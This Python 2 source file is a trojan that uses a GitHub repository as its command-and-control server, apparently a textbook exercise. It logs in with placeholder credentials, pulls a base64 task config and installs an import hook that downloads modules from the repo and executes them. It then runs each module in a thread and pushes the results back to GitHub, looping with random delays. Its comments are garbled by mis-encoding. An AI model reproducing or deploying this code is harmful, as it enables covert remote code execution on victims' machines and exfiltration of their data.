# -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"   # �ھڦ�id�M�w��config�ؿ����@��JSON��

trojan_config = "%s.json" % trojan_id     # �غc�XJSON�ɦW
data_path     = "data/%s/" % trojan_id    # �غc�Xdata�U�l�ؿ�
trojan_modules= []         # �N�ΨӦs��n���檺�Ҳ�

task_queue    = Queue.Queue()
configured    = False

class GitImporter(object): # �C��n���J���s�b���ҲծɡA�|�ϥΦ�class

    def __init__(self):
        
        self.current_module_code = ""
        
    
    def find_module(self,fullname,path=None): # ���եh���Ҳ�
        
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)  # �qGitHub
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)  # �ѽX
                return self
            
                
        return None

    def load_module(self,name):  # ��ڥh���J�Ҳ� (�b���Ҳի�)
        
        module = imp.new_module(name)  # �ϥ�imp�Ҳեh�إߤ@�Ӫťշs���Ҳ�
        
        exec self.current_module_code in module.__dict__   # ��GitHub��쪺�Ҳթ�i�h
        
        sys.modules[name] = module   # �[�J�ҲղM�椤
        
        return module



def connect_to_github():
    gh = login(username="yyyy",password="xxxxxxx")  # ��J�A��GitHub�b�K
    #print gh.me()
    #print gh.me().name
    #print gh.me().login
    #print gh.me().followers_count

    repo = gh.repository("yyyy", "chapter7")
    branch = repo.branch("master")    
    return gh,repo,branch

def get_file_contents(filepath): # �qGitHub���o�ɮ�(�]�w�ɩμҲ���)�AŪ�쥻��
    
    gh,repo,branch = connect_to_github()  # �s�u��GitHub
        
    #tree = branch.commit.commit.tree.recurse() # github3 v.0.9.1�Ϊk
    tree = branch.commit.commit.tree.to_tree().recurse() # �s��github3�Ϊk
    
    for filename in tree.tree:
        
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            
            blob = repo.blob(filename._json_data['sha'])
            
            return blob.content  # �Ǧ^�ɮפ��e

    return None

def get_trojan_config():  # �qGitHub���oconfig json�ɡA�H�T�w�n���樺�ǼҲ�
    global configured
    
    config_json   = get_file_contents(trojan_config)
    print "xxx:", base64.b64decode(config_json)
    config        = json.loads(base64.b64decode(config_json))
    print "yyy:", config
    configured    = True
    
    for task in config:
        
        if task['module'] not in sys.modules:
            print "import %s" % task['module']            
            exec("import %s" % task['module'])  # ��GitHub�פJ���Ҳ�
            
    return config

def store_module_result(data): # �N�차�ݰ��浲�Gpush��GitHub
    
    gh,repo,branch = connect_to_github()
    
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    print "zzzz:", remote_path                               
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()  # ����Ҳդ���run�禡
    task_queue.get()
    
    # store the result in our repo
    store_module_result(result)  # �N���浲�G��bGitHub
    
    return



sys.meta_path = [GitImporter()]  # �[�J�e���g���Ҳո��J��

while True:  # �차�D�j��
    
    if task_queue.empty():

        config = get_trojan_config() # �qGitHub���o�]�w��
        
        for task in config:  # ����]�w�ɤ����W�n���檺�C�@�ӼҲ�
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
            
    time.sleep(random.randint(1000,10000))
        